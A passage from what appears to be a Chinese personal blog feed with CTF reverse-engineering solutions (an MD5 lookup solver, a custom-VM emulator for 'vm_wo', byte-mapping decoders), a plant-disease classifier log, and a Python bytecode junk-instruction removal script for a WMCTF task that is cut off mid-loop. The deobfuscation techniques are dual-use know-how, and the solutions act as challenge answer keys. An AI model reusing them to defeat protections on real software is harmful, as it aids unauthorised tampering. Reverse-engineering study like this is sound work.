        &#39;4e44f1ac85cd60e3caa56bfd4afb675e&#39;,
        &#39;45cf8ddfae1d78741d8f1c622689e4af&#39;,
        &#39;3cfd436919bc3107d68b912ee647f341&#39;,
        &#39;39abe4bca904bca5a11121955a2996bf&#39;,
        &#39;4e44f1ac85cd60e3caa56bfd4afb675e&#39;,
        &#39;37327bb06c83cb29cefde1963ea588aa&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;23e65a679105b85c5dc7034fded4fb5f&#39;,
        &#39;10e21da237a4a1491e769df6f4c3b419&#39;,
        &#39;71b0438bf46aa26928c7f5a371d619e1&#39;,
        &#39;af85d512594fc84a5c65ec9970956ea5&#39;,
        &#39;39abe4bca904bca5a11121955a2996bf&#39;,]
    for query_hash in a:
        found_char = [char for char, md5_hash in char_to_md5.items() if md5_hash == query_hash]

        print(found_char[0],end=&quot;&quot;)


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<h3 id="vm-wo"><a href="#vm-wo" class="headerlink" title="vm_wo"></a>vm_wo</h3><p>转化提取一下opcode，模拟流程，单字节加密直接映射回去就行</p>
<pre><code class="cpp">#include&lt;stdio.h&gt;
using namespace std;

unsigned char opcode[4][15] = 
&#123;
    &#123;0x1A, 0x00, 0x03, 0x19, 0x01, 0x01, 0x0D, 0x02, 0x07, 0x18, 0x01, 0x02, 0x01, 0x00, 0x03&#125;, 
    &#123;0x1A, 0x00, 0x03, 0x19, 0x01, 0x02, 0x0D, 0x02, 0x06, 0x18, 0x01, 0x02, 0x01, 0x00, 0x04&#125;,
    &#123;0x1A, 0x00, 0x03, 0x19, 0x01, 0x03, 0x0D, 0x02, 0x05, 0x18, 0x01, 0x02, 0x01, 0x00, 0x05&#125;,
    &#123;0x1A, 0x00, 0x03, 0x19, 0x01, 0x04, 0x0D, 0x02, 0x04, 0x18, 0x01, 0x02, 0x01, 0x00, 0x06&#125;
&#125;;
unsigned char tmp[4][15];

unsigned char vm_body[6];
unsigned char *reg;
unsigned int algn[2];

void vm(unsigned char *op)
&#123;
    algn[1] = 0;
    algn[0] = 0;
    int i = 0;
    if(i &lt; 15)
    &#123;
        while(1)
        &#123;
            reg = op + i;
            unsigned char eax = reg[1];
            unsigned char ebx = reg[1];
            unsigned char ecx = reg[2];
            unsigned char edx = reg[2];
            unsigned char v11, v12, v13, v14, v15, v16;
            //for(int j = 0; j &lt; 15; j++)printf(&quot;%d &quot;, op[j]);
            //printf(&quot;i = %d reg[0] = %d\n&quot;, i, reg[0]);
            //printf(&quot;ebx = %d, ecx = %d\n&quot;, ebx, ecx);
            switch(reg[0])
            &#123;
                case 0:
                    v11 = vm_body[ebx];
                      vm_body[ebx] = vm_body[edx];
                      vm_body[edx] = v11;
                      algn[1] += 3;
                      i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 1:
                  	vm_body[ebx] ^= vm_body[ecx];//printf(&quot;vm_body[ebx] ^= vm_body[ecx];\n&quot;);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 2:
                  	vm_body[ebx] += ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 3:
                  	vm_body[ebx] += vm_body[ecx];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 4:
                  	vm_body[ebx] -= ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 5:
                  	vm_body[ebx] -= vm_body[ecx];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 6:
                  	vm_body[ebx] *= ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 7:
                  	vm_body[ebx] *= vm_body[ecx];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                case 8:
                  	vm_body[ebx] = (unsigned char)vm_body[ebx] / ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 9:
                  	vm_body[ebx] = (unsigned char)vm_body[ebx] / (unsigned char)vm_body[ecx];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 10:
                  	vm_body[ebx] = (unsigned char)vm_body[ebx] % ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 11:
                  	vm_body[ebx] = (unsigned char)vm_body[ebx] % (unsigned char)vm_body[ecx];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 12:
                  	v12 = (unsigned char)vm_body[ebx];
                  	vm_body[ebx] = v12 &lt;&lt; ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 13:
                  	v12 = (unsigned char)vm_body[0];
                  	vm_body[ebx] = v12 &lt;&lt; ecx;//printf(&quot;vm_body[ebx] = (unsigned char)vm_body[0] &lt;&lt; ecx;\n&quot;);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 14:
                  	v15 = vm_body[ebx];
                    vm_body[algn[0] + 16] = v15;
                  	algn[0] = algn[0] + 1;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 15:
                  	v13 = (unsigned char)vm_body[ebx];
                  	printf(&quot;%d\n&quot;, v13);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 16:
                  	v14 = algn[0] - 1;
                  	algn[0] = algn[0] - 1;
                  	v13 = vm_body[v14 + 16];
                  	printf(&quot;%d\n&quot;, v13);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 17:
                  	if ( !vm_body[ebx] )
                    &#123;
                    	algn[1] = ecx;
                  		algn[1] += 3;
                  		i = algn[1];
                          if ( algn[1] &gt;= 15 )
                            break;
                        continue;
                  	&#125;
                  	else algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 18:
                  	if ( vm_body[ebx] )
                    algn[1] = ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 19:
                  	algn[1] = eax;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 20:
                  	ebx = (unsigned char)vm_body[ebx];
                  	v15 = vm_body[ebx];
                    vm_body[algn[0] + 16] = v15;
                  	algn[0] = algn[0] + 1;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 21:
                  	v16 = algn[0] - 1;
                  	algn[0] = algn[0] - 1;
                  	vm_body[0] = vm_body[v16 + 16];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 22:
                  	v15 = eax;
                  	vm_body[algn[0] + 16] = v15;
                  	algn[0] = algn[0] + 1;
                  	algn[1] += 3;
                  	i = algn[1];
                  	if ( algn[1] &gt;= 15 )
                    	break;
                  	continue;
                case 23:
                	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 24:
                  	vm_body[0] = vm_body[2] | vm_body[1];//printf(&quot;vm_body[0] = vm_body[2] | vm_body[1];\n&quot;);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 25:
                	vm_body[ebx] = (unsigned char)vm_body[0] &gt;&gt; ecx;//printf(&quot;vm_body[ebx] = (unsigned char)vm_body[0] &gt;&gt; ecx;\n&quot;);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 26:
                  	vm_body[ebx] = ecx;//printf(&quot;vm_body[ebx] = ecx;\n&quot;);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                      continue;   
                default:    
                  	algn[1] += 3;
                  	i = algn[1];
                  	if ( algn[1] &gt;= 15 )
                    	break;
                  	continue;
            &#125;
            break;
        &#125;
    &#125;
&#125;

void init()
&#123;
    for(int i = 0; i &lt; 4; i++)
    &#123;
        for(int j = 0; j &lt; 15; j++)
        &#123;
            tmp[i][j] = opcode[i][j];
        &#125;
    &#125;
&#125;

int main()
&#123;
    int len = 29;
    unsigned char flag[233] = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_&quot;;
    *(unsigned int *)&amp;vm_body[3] = 0xBEEDBEEF;
    
    for(int i = 0; i &lt; 65; i++)
    &#123;
        
        init();
        unsigned char a = flag[i];
        tmp[0][2] = flag[i];
        vm(tmp[0]);
        tmp[1][2] = vm_body[0];
        vm(tmp[1]);
        tmp[2][2] = vm_body[0];
        vm(tmp[2]);
        tmp[3][2] = vm_body[0];
        vm(tmp[3]);
        //printf(&quot;vm_body[0] = %d\n&quot;, vm_body[0]);
        
        flag[i] = ((unsigned char)vm_body[0] &gt;&gt; 5) | (8 * vm_body[0]);
        printf(&quot;0x%x : \&quot;%c\&quot;, &quot;, flag[i], a);
    &#125;
&#125;

        
    
    
    

</code></pre>
<pre><code class="python">enc = [0xDF, 0xD5, 0xF1, 0xD1, 0xFF, 0xDB, 0xA1, 0xA5, 0x89, 0xBD,
  0xE9, 0x95, 0xB3, 0x9D, 0xE9, 0xB3, 0x85, 0x99, 0x87, 0xBF,
  0xE9, 0xB1, 0x89, 0xE9, 0x91, 0x89, 0x89, 0x8F, 0xAD]

mp = &#123;0x35 : &quot;1&quot;, 0x33 : &quot;2&quot;, 0x31 : &quot;3&quot;, 0x3f : &quot;4&quot;, 0x3d : &quot;5&quot;, 0x3b : &quot;6&quot;, 0x39 : &quot;7&quot;, 0x27 : &quot;8&quot;, 0x25 : &quot;9&quot;, 0x37 : &quot;0&quot;, 0x95 : &quot;a&quot;, 0x93 : &quot;b&quot;, 0x91 : &quot;c&quot;, 0x9f : &quot;d&quot;, 0x9d : &quot;e&quot;, 0x9b : &quot;f&quot;, 0x99 : &quot;g&quot;, 0x87 : &quot;h&quot;, 0x85 : &quot;i&quot;, 0x83 : &quot;j&quot;, 0x81 : &quot;k&quot;, 0x8f : &quot;l&quot;, 0x8d : &quot;m&quot;, 0x8b : &quot;n&quot;, 0x89 : &quot;o&quot;, 0xb7 : &quot;p&quot;, 0xb5 : &quot;q&quot;, 0xb3 : &quot;r&quot;, 0xb1 : &quot;s&quot;, 0xbf : &quot;t&quot;, 0xbd : &quot;u&quot;, 0xbb : &quot;v&quot;, 0xb9 : &quot;w&quot;, 0xa7 : &quot;x&quot;, 0xa5 : &quot;y&quot;, 0xa3 : &quot;z&quot;, 0xd5 : &quot;A&quot;, 0xd3 : &quot;B&quot;, 0xd1 : &quot;C&quot;, 0xdf : &quot;D&quot;, 0xdd : &quot;E&quot;, 0xdb : &quot;F&quot;, 0xd9 : &quot;G&quot;, 0xc7 : &quot;H&quot;, 0xc5 : &quot;I&quot;, 0xc3 : &quot;J&quot;, 0xc1 : &quot;K&quot;, 0xcf : &quot;L&quot;, 0xcd : &quot;M&quot;, 0xcb : &quot;N&quot;, 0xc9 : &quot;O&quot;, 0xf7 : &quot;P&quot;, 0xf5 : &quot;Q&quot;, 0xf3 : &quot;R&quot;, 0xf1 : &quot;S&quot;, 0xff : &quot;T&quot;, 0xfd : &quot;U&quot;, 0xfb : &quot;V&quot;, 0xf9 : &quot;W&quot;, 0xe7 : &quot;X&quot;, 0xe5 : &quot;Y&quot;, 0xe3 : &quot;Z&quot;, 0xa1 : &quot;&#123;&quot;, 0xad : &quot;&#125;&quot;, 0xe9 : &quot;_&quot;&#125;

for i in enc:
    print(mp[i],end=&quot;&quot;)
</code></pre>
<h3 id="CSGO"><a href="#CSGO" class="headerlink" title="CSGO"></a>CSGO</h3><p>patch反调试，动调获取base变表直接在线解即可<br>表：LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;ABCDEFGHIJK</p>
]]></content>
  </entry>
  <entry>
    <title>cv与一些classify事项记录</title>
    <url>/2023/07/17/cv%E4%B8%8E%E4%B8%80%E4%BA%9Bclassify%E4%BA%8B%E9%A1%B9%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h6 id="preface-一些project记录，慢慢学吧调参炼丹"><a href="#preface-一些project记录，慢慢学吧调参炼丹" class="headerlink" title="preface:一些project记录，慢慢学吧调参炼丹"></a>preface:一些project记录，慢慢学吧调参炼丹</h6><span id="more"></span>

<h5 id="需要实现的功能是接收树莓派传过来的植物图像，对其是否病害进行分类预测，用的训练集是-这个-病虫害分类数据集-飞桨AI-Studio-baidu-com-，训练集的话需要写一个加载json数据的方法"><a href="#需要实现的功能是接收树莓派传过来的植物图像，对其是否病害进行分类预测，用的训练集是-这个-病虫害分类数据集-飞桨AI-Studio-baidu-com-，训练集的话需要写一个加载json数据的方法" class="headerlink" title="需要实现的功能是接收树莓派传过来的植物图像，对其是否病害进行分类预测，用的训练集是[这个](病虫害分类数据集 - 飞桨AI Studio (baidu.com))，训练集的话需要写一个加载json数据的方法"></a>需要实现的功能是接收树莓派传过来的植物图像，对其是否病害进行分类预测，用的训练集是[这个](<a href="https://aistudio.baidu.com/aistudio/datasetdetail/76075">病虫害分类数据集 - 飞桨AI Studio (baidu.com)</a>)，训练集的话需要写一个加载json数据的方法</h5><pre><code class="python">def create_image_folders_by_class(json_file_path, image_folder_path, output_folder_path):
    with open(json_file_path, &#39;r&#39;) as f:
        labels_data = json.load(f)

    # 分割训练集和验证集
    train_data, val_data = train_test_split(labels_data, test_size=0.2, random_state=42)

    for name, data in [(&#39;train&#39;, train_data), (&#39;val&#39;, val_data)]:
        for item in data:
            class_folder = os.path.join(output_folder_path, name, str(item[&#39;disease_class&#39;]))
            os.makedirs(class_folder, exist_ok=True)
            shutil.copy(os.path.join(image_folder_path, item[&#39;image_id&#39;]), os.path.join(class_folder, item[&#39;image_id&#39;]))
</code></pre>
<h5 id="最开始使用的是ResNet50，后面感觉正确率太低了会不会跟模型有关，改成densenet169，效果是差不太多…"><a href="#最开始使用的是ResNet50，后面感觉正确率太低了会不会跟模型有关，改成densenet169，效果是差不太多…" class="headerlink" title="最开始使用的是ResNet50，后面感觉正确率太低了会不会跟模型有关，改成densenet169，效果是差不太多…"></a>最开始使用的是ResNet50，后面感觉正确率太低了会不会跟模型有关，改成densenet169，效果是差不太多…</h5><h5 id="还发现一个小问题，数据集里面都是带病的植物class，好像没有健康的…"><a href="#还发现一个小问题，数据集里面都是带病的植物class，好像没有健康的…" class="headerlink" title="还发现一个小问题，数据集里面都是带病的植物class，好像没有健康的…"></a>还发现一个小问题，数据集里面都是带病的植物class，好像没有健康的…</h5><h5 id="于是乎感觉反正准确率偏低了，干脆根据置信度分一类专门来判别没病的植物么得，重写一些训模型的部分，log一下平均置信度和方差，然后假装正则大概放一个置信度来判别"><a href="#于是乎感觉反正准确率偏低了，干脆根据置信度分一类专门来判别没病的植物么得，重写一些训模型的部分，log一下平均置信度和方差，然后假装正则大概放一个置信度来判别" class="headerlink" title="于是乎感觉反正准确率偏低了，干脆根据置信度分一类专门来判别没病的植物么得，重写一些训模型的部分，log一下平均置信度和方差，然后假装正则大概放一个置信度来判别"></a>于是乎感觉反正准确率偏低了，干脆根据置信度分一类专门来判别没病的植物么得，重写一些训模型的部分，log一下平均置信度和方差，然后假装正则大概放一个置信度来判别</h5><p><img src="/2023/07/17/cv%E4%B8%8E%E4%B8%80%E4%BA%9Bclassify%E4%BA%8B%E9%A1%B9%E8%AE%B0%E5%BD%95/image-20230717164424184.png" alt="image-20230717164424184"></p>
<h5 id="大概大概这样子吧"><a href="#大概大概这样子吧" class="headerlink" title="大概大概这样子吧"></a>大概大概这样子吧</h5><pre><code class="python">def predict_image(image_path):
    img = Image.open(image_path)
    img = data_transform(img).unsqueeze(0)
    img = img.to(device)
    output = model(img)
    probs = torch.nn.functional.softmax(output, dim=1)
    max_prob, preds = torch.max(probs, 1)

    # print(max_prob)
    threshold = 0.7
    if max_prob &lt; threshold:
        return &#39;Low confidence&#39;
    else:
        return preds
</code></pre>
<h5 id="最后正确率还是很一眼难尽，目前是没做数据增强的，应该是不能变太多，主要是病害植物和普通植物确实分类不明显，暂且原谅这程序的低准确率…"><a href="#最后正确率还是很一眼难尽，目前是没做数据增强的，应该是不能变太多，主要是病害植物和普通植物确实分类不明显，暂且原谅这程序的低准确率…" class="headerlink" title="最后正确率还是很一眼难尽，目前是没做数据增强的，应该是不能变太多，主要是病害植物和普通植物确实分类不明显，暂且原谅这程序的低准确率…"></a>最后正确率还是很一眼难尽，目前是没做数据增强的，应该是不能变太多，主要是病害植物和普通植物确实分类不明显，暂且原谅这程序的低准确率…</h5><h5 id="mark一个奇怪的事情：训练模型过程中每个epoch正确率都还不错有50左右，存好model以后再测试正确率就掉到个位数。"><a href="#mark一个奇怪的事情：训练模型过程中每个epoch正确率都还不错有50左右，存好model以后再测试正确率就掉到个位数。" class="headerlink" title="mark一个奇怪的事情：训练模型过程中每个epoch正确率都还不错有50左右，存好model以后再测试正确率就掉到个位数。"></a>mark一个奇怪的事情：训练模型过程中每个epoch正确率都还不错有50左右，存好model以后再测试正确率就掉到个位数。</h5><h6 id="7-18更新"><a href="#7-18更新" class="headerlink" title="*7-18更新"></a>*7-18更新</h6><h5 id="本来dl部分给的数据做的极端处理是mean值-三倍标准差，结果在测温湿度之类的1h内数据根本不变化，导致classifier基本上不工作……这边选择改成手动给调极端数据来训分类器了…"><a href="#本来dl部分给的数据做的极端处理是mean值-三倍标准差，结果在测温湿度之类的1h内数据根本不变化，导致classifier基本上不工作……这边选择改成手动给调极端数据来训分类器了…" class="headerlink" title="本来dl部分给的数据做的极端处理是mean值+-三倍标准差，结果在测温湿度之类的1h内数据根本不变化，导致classifier基本上不工作……这边选择改成手动给调极端数据来训分类器了…"></a>本来dl部分给的数据做的极端处理是mean值+-三倍标准差，结果在测温湿度之类的1h内数据根本不变化，导致classifier基本上不工作……这边选择改成手动给调极端数据来训分类器了…</h5><h6 id="7-27更新（补）"><a href="#7-27更新（补）" class="headerlink" title="*7-27更新（补）"></a>*7-27更新（补）</h6><h5 id="最后更新了label的方法，加入了adam优化，最终准确率94"><a href="#最后更新了label的方法，加入了adam优化，最终准确率94" class="headerlink" title="最后更新了label的方法，加入了adam优化，最终准确率94%"></a>最后更新了label的方法，加入了adam优化，最终准确率94%</h5><p><img src="/2023/07/17/cv%E4%B8%8E%E4%B8%80%E4%BA%9Bclassify%E4%BA%8B%E9%A1%B9%E8%AE%B0%E5%BD%95/image-20230727115911697.png" alt="image-20230727115911697"></p>
<h6 id="（实测效果也是不错来的，有点点过于灵敏，置信度给的不准，实际使用稍微要求有点严苛）"><a href="#（实测效果也是不错来的，有点点过于灵敏，置信度给的不准，实际使用稍微要求有点严苛）" class="headerlink" title="（实测效果也是不错来的，有点点过于灵敏，置信度给的不准，实际使用稍微要求有点严苛）"></a>（实测效果也是不错来的，有点点过于灵敏，置信度给的不准，实际使用稍微要求有点严苛）</h6><h6 id="不过背景处理啥的还学不太明白，也没啥时间，就先这样子了"><a href="#不过背景处理啥的还学不太明白，也没啥时间，就先这样子了" class="headerlink" title="不过背景处理啥的还学不太明白，也没啥时间，就先这样子了"></a>不过背景处理啥的还学不太明白，也没啥时间，就先这样子了</h6>]]></content>
      <tags>
        <tag>cv</tag>
      </tags>
  </entry>
  <entry>
    <title>初探python bytecode</title>
    <url>/2023/08/23/%E5%88%9D%E6%8E%A2python-bytecode/</url>
    <content><![CDATA[<h6 id="preface-起因是wmctf的一道python题，包括了修复python字节码花指令和虚拟机等考点。算是萌新初见python花，花了一上午学习修了花指令，反编译不了不过可以获得字节码，理论上手动反汇编得到python码就没问题了。但实际上这里的字节码结构也有点问题，顺便从学长那里听闻了一下下antlr这种东西。然后手动翻译的伪代码也错漏百出…最后是学长写了脚本给他自动化修了得以告一段落。不过确实得回来补补python的编译结构功课了。"><a href="#preface-起因是wmctf的一道python题，包括了修复python字节码花指令和虚拟机等考点。算是萌新初见python花，花了一上午学习修了花指令，反编译不了不过可以获得字节码，理论上手动反汇编得到python码就没问题了。但实际上这里的字节码结构也有点问题，顺便从学长那里听闻了一下下antlr这种东西。然后手动翻译的伪代码也错漏百出…最后是学长写了脚本给他自动化修了得以告一段落。不过确实得回来补补python的编译结构功课了。" class="headerlink" title="preface:起因是wmctf的一道python题，包括了修复python字节码花指令和虚拟机等考点。算是萌新初见python花，花了一上午学习修了花指令，反编译不了不过可以获得字节码，理论上手动反汇编得到python码就没问题了。但实际上这里的字节码结构也有点问题，顺便从学长那里听闻了一下下antlr这种东西。然后手动翻译的伪代码也错漏百出…最后是学长写了脚本给他自动化修了得以告一段落。不过确实得回来补补python的编译结构功课了。"></a>preface:起因是wmctf的一道python题，包括了修复python字节码花指令和虚拟机等考点。算是萌新初见python花，花了一上午学习修了花指令，反编译不了不过可以获得字节码，理论上手动反汇编得到python码就没问题了。但实际上这里的字节码结构也有点问题，顺便从学长那里听闻了一下下antlr这种东西。然后手动翻译的伪代码也错漏百出…最后是学长写了脚本给他自动化修了得以告一段落。不过确实得回来补补python的编译结构功课了。</h6><span id="more"></span>

<h5 id="题目是3-9的，不过在这里就可以直接搜其他版本的也一样cpython-3-9"><a href="#题目是3-9的，不过在这里就可以直接搜其他版本的也一样cpython-3-9" class="headerlink" title="题目是3.9的，不过在这里就可以直接搜其他版本的也一样cpython 3.9"></a>题目是3.9的，不过在这里就可以直接搜其他版本的也一样<a href="https://github.com/python/cpython/blob/3.9/Objects/codeobject.c">cpython 3.9</a></h5><h5 id><a href="#" class="headerlink" title></a><img src="/2023/08/23/%E5%88%9D%E6%8E%A2python-bytecode/image-20230823153127421.png" alt="image-20230823153127421"></h5><h5 id="这里的co-code是字节码的长度标识，在patch时需要注意修复长度，其他标志位也需要注意（赛时就是co-lnotab对齐问题导致的无法反编译）"><a href="#这里的co-code是字节码的长度标识，在patch时需要注意修复长度，其他标志位也需要注意（赛时就是co-lnotab对齐问题导致的无法反编译）" class="headerlink" title="这里的co_code是字节码的长度标识，在patch时需要注意修复长度，其他标志位也需要注意（赛时就是co_lnotab对齐问题导致的无法反编译）"></a>这里的co_code是字节码的长度标识，在patch时需要注意修复长度，其他标志位也需要注意（赛时就是co_lnotab对齐问题导致的无法反编译）</h5><p><img src="/2023/08/23/%E5%88%9D%E6%8E%A2python-bytecode/image-20230823154536966.png" alt="image-20230823154536966"></p>
<h5 id="cpython-x2F-Objects-x2F-lnotab-notes-txt-at-3-9-·-python-x2F-cpython-github-com-可以参考文档"><a href="#cpython-x2F-Objects-x2F-lnotab-notes-txt-at-3-9-·-python-x2F-cpython-github-com-可以参考文档" class="headerlink" title="cpython&#x2F;Objects&#x2F;lnotab_notes.txt at 3.9 · python&#x2F;cpython (github.com)可以参考文档"></a><a href="https://github.com/python/cpython/blob/3.9/Objects/lnotab_notes.txt">cpython&#x2F;Objects&#x2F;lnotab_notes.txt at 3.9 · python&#x2F;cpython (github.com)</a>可以参考文档</h5><h5 id="去花脚本（R1mao那里偷来的）："><a href="#去花脚本（R1mao那里偷来的）：" class="headerlink" title="去花脚本（R1mao那里偷来的）："></a>去花脚本（R1mao那里偷来的）：</h5><pre><code class="python">import dis
import RightBack
import marshal
import types
from graphviz import Digraph
 

def get_funcs(module):
    funcs = []
    for name in dir(module):
        obj = getattr(module, name)
        if isinstance(obj, types.FunctionType):
           funcs.append(obj)
    return funcs

def get_extend_size(code, offset):
    ptr = offset

    while True:
        op = code[ptr]
        if op != dis.EXTENDED_ARG:
            break
        ptr += 2

    return ptr - offset
    

class InstWrapper:
    def __init__(self, prefix_insn : list[dis.Instruction], main_insn : dis.Instruction):
        self.offset = main_insn.offset
        self.prefix_insn = prefix_insn
        self.main_insn = main_insn
        if len(prefix_insn) != 0:
            self.offset = prefix_insn[0].offset
        self.preds = set()
        self.succs = set()

    def edge(self, v1):
        v1.preds.add(self)
        self.succs.add(v1)

    def unlink(self):
        for n in self.preds:
            n.succs.remove(self)
        for n in self.succs:
            n.preds.remove(self)

    def size(self):
        return 2 * (len(self.prefix_insn) + 1)

    def print_asm(self):
        assert len(self.succs) &lt;= 2
        result = []
        if self.main_insn.opcode not in dis.hasjabs and self.main_insn.opcode not in dis.hasjrel:
            for p in self.prefix_insn:
                result += [p.opcode, p.arg]
            result += [self.main_insn.opcode]
            if self.main_insn.arg:
                result.append(self.main_insn.arg)
            else:
                result.append(0)
            return result
        s = list(self.succs)
        ref_target = None
        for n in s:
            if self.offset + self.size() != n.offset:
                ref_target = n.offset
                break
        argval = ref_target
        if self.main_insn.opcode in dis.hasjrel:
            argval = ref_target - (self.offset + len(self.prefix_insn) * 2) - 2
        byte_size = len(self.prefix_insn) + 1
        argval &amp;= (2 ** (8 * byte_size)) - 1
        raw = int.to_bytes(argval, byte_size, byteorder=&#39;big&#39;)
        for i in range(len(self.prefix_insn)):
            result += [dis.opmap[&#39;EXTENDED_ARG&#39;], raw[i]]
        result += [self.main_insn.opcode, raw[len(self.prefix_insn)]]
        return result
            
    def __str__(self) -&gt; str:
        return &#39;%04d %s\t(%s)&#39; % (self.offset, self.main_insn.opname, str(self.main_insn.argval) if self.main_insn.argval else &#39;&#39;)
    
def fix_invalid(func):
    raw_code = func.__code__.co_code
    insn_map = &#123;&#125;

    for insn in dis._get_instructions_bytes(raw_code):
        insn_map[insn.offset] = insn

    trace_result = dict()

    def trace_pc(code, insn_map, offset):
        nonlocal trace_result
        assert offset in insn_map
        
        extend_size = get_extend_size(code, offset)
        cur_size = extend_size + 2
        cur = insn_map[offset + extend_size]
        if offset not in trace_result.keys():
            trace_result.update(&#123;offset : cur_size&#125;)
        else:
            return
        
        if cur.opname == &#39;RETURN_VALUE&#39;:
            return
        elif cur.opcode in dis.hasjabs + dis.hasjrel:
            jump_target = cur.argval
            if cur.opname == &#39;JUMP_FORWARD&#39; or cur.opname == &#39;JUMP_ABSOLUTE&#39;:
                trace_pc(code, insn_map, jump_target)
                return
            else:
                trace_pc(code, insn_map, jump_target)
                trace_pc(code, insn_map, offset + cur_size)
        else:
            trace_pc(code, insn_map, offset + cur_size)

    trace_pc(raw_code, insn_map, 0)

    flat_mem = [0 for i in range(len(raw_code))]
    for k, v in trace_result.items():
        for i in range(v):
            flat_mem[k + i] = 1
    new_code = []
    idx = 0 
    for d in raw_code:
        if flat_mem[idx] == 1:
            new_code.append(d)
        else:
            new_code.append(dis.opmap[&#39;NOP&#39;])
        idx += 1

    new_code = bytes(new_code)
    return new_code

def recompile(func, new_code):
    all_wrap = &#123;&#125;
    worker = &#123;&#125;
    temp = []
    last = None
    for insn in dis._get_instructions_bytes(new_code):
        if insn.opname == &#39;EXTENDED_ARG&#39;:
            temp.append(insn)
        else:
            inst = InstWrapper(temp.copy(), insn)
            if inst.offset in worker.keys():
                for other in worker[inst.offset]:
                    other.edge(inst)
                worker.pop(inst.offset)
            if last and last.main_insn.opname != &#39;RETURN_VALUE&#39; and last.main_insn.opname != &#39;JUMP_FORWARD&#39; and last.main_insn.opname != &#39;JUMP_ABSOLUTE&#39;:
                last.edge(inst)
            last = inst
            if inst.main_insn.opcode in dis.hasjabs + dis.hasjrel:
                
                target = inst.main_insn.argval
                if target in all_wrap.keys():
                    inst.edge(all_wrap[target])
                else:
                    if target in worker.keys():
                        worker[target].add(inst)
                    else:
                        worker[target] = set([inst])
            all_wrap.update(&#123;inst.offset : inst&#125;)
            temp.clear()


    all_wrap = list(all_wrap.values())
    while True:
        to_remove = []
        for n in all_wrap:
            if len(n.preds) == 0 and n.offset != 0:
                n.unlink()
                to_remove.append(n)
            if len(n.preds) == 1 and len(n.succs) == 1 and n.main_insn.opname == &#39;JUMP_FORWARD&#39;:
                n.unlink()
                p = n.preds.pop()
                s = n.succs.pop()
                p.edge(s)
                to_remove.append(n)
        if len(to_remove) == 0:
            break
        for n in to_remove:
            all_wrap.remove(n)

    entry_point = None
    for i in all_wrap:
        if i.offset == 0:
            entry_point = i
            break
    
    visited = set()
    offset = 0
    def visit(cur : InstWrapper):
        nonlocal visited, offset
        cur.offset = offset
        offset = offset + cur.size()
        succs = sorted(list(cur.succs), key = lambda a : a.offset)
        for node in succs:
            if node not in visited:
                visited.add(node)
                visit(node)

    visit(entry_point)
    new_bytecode = []
    for w in all_wrap:
        new_bytecode += w.print_asm()
    print(new_bytecode)
    new_bytecode = bytes(new_bytecode)

    code = func.__code__
    new_code = types.CodeType(
        code.co_argcount,
        code.co_posonlyargcount,
        code.co_kwonlyargcount,
        code.co_nlocals,
        code.co_stacksize,
        code.co_flags,
        new_bytecode, 
        code.co_consts,
        code.co_names,
        code.co_varnames,
        code.co_filename,
        func.__name__,
        code.co_firstlineno,
        code.co_lnotab,
        code.co_freevars,
        code.co_cellvars
    )
    dot = Digraph(func.__name__)
    for n in all_wrap:
        dot.node(str(n.offset), str(n))
        
    for n in all_wrap:
        for pred in n.preds:
            dot.edge(str(pred.offset), str(n.offset))
    #dot.view()
    return new_code


file = open(&#39;RightBack.pyc&#39;, &#39;rb&#39;)
data = file.read()
file.close()
file = open(&#39;RightBack_fix.pyc&#39;, &#39;wb&#39;)

for f in get_funcs(RightBack):
